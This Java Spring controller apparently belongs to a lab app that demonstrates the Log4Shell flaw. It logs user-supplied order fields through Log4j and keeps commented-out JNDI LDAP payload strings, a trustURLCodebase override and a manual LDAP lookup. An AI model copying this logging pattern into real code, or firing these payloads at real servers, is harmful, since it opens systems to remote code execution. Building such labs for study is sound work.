package ch.unige.biscuits.rest;

import java.util.Objects;
import java.util.Optional;

import org.springframework.http.HttpEntity;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import ch.unige.biscuits.domain.Order;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;
import org.apache.logging.log4j.core.net.JndiManager;
import org.apache.logging.log4j.core.lookup.JndiLookup;

@RestController
@RequestMapping("/orders")
public class OrdersController {
    private static Logger logger = LogManager.getLogger();
    
    @PostMapping("")
    @CrossOrigin
    public HttpEntity<Optional<Order>> get(@RequestBody Order order) {
        logger.info("Order :" + order.email + order.location);
        logger.info(order.biscuits);
        //logger.info("Trying to lookup..."); benspassword
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        //logger.info("${jndi:ldap://localhost:1389/a}");
        //System.out.println("Ok");
        /*JndiManager jndiManager = JndiManager.getDefaultManager();
        try {
            Object obj = jndiManager.lookup("ldap://0.0.0.0:1389/dc=example,dc=com");
            
            logger.info("Got object" + obj.toString());
            logger.info("Got string representation of class :" + obj);
        } catch(Exception e) {
            e.printStackTrace();
        } */
        //logger.info("${jndi:ldap://0.0.0.0:1389/Exploit}");
        
        // finally https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1
        //logger.info(org.apache.logging.log4j.util.PropertiesUtil.class.getPackage().getImplementationVersion());
        // logger.info("POST /users/{}", user);    
        return null;
    }
}
